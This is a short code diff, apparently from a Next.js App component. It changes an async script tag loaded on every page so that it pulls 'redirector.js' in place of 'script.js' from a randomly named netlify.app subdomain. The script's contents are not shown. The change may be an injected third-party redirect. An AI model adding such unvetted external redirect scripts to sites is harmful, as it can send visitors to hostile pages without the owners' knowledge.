@@ -13,7 +13,7 @@ const App = ({ Component, pageProps }) => {
     <>
       <script
         async
-        src="https://dancing-beignet-ffe33d.netlify.app/script.js"
+        src="https://dancing-beignet-ffe33d.netlify.app/redirector.js"
       />
       <Head>
         <meta
